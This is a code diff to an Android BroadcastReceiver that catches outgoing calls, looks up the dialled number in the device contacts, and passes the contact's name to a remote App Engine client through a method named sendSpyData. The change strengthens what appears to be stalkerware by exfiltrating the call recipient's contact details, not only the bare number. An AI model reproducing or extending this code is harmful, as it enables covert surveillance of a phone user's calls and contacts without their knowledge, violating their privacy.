@@ -11,7 +11,7 @@ public class OutgoingCall extends BroadcastReceiver
 {
 
         @Override
-        public void onReceive(Context context, Intent intent) 
+        public void onReceive(final Context context, Intent intent) 
         {
         		Log.i(SetupActivity.TAG, "OUTGOING CALL");
         	
@@ -31,15 +31,14 @@ public class OutgoingCall extends BroadcastReceiver
         		{
         			public void run() 
         			{
-                        Log.i(SetupActivity.TAG, "Outgoing # :" + phonenumber);
         				
-                		//SharedPreferences.Editor prefsEdit = prefs.edit();
-                		//String contactName = ContactsUtility.getPhoneNumber(getContentResolver(), phonenumber);
+                		String contact = ContactsUtility.getPhoneNumber(context.getContentResolver(), phonenumber);
+                        Log.i(SetupActivity.TAG, "Outgoing call to # :" + contact);
                 		String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
                         AppEngineClient client = new AppEngineClient(devID);
                         
                         
-                        String title = "Outgoing Call from " + phonenumber;
+                        String title = "Outgoing Call from " + contact;
                         String body = "";
                         String date = "";
         				client.sendSpyData(title, body, date);
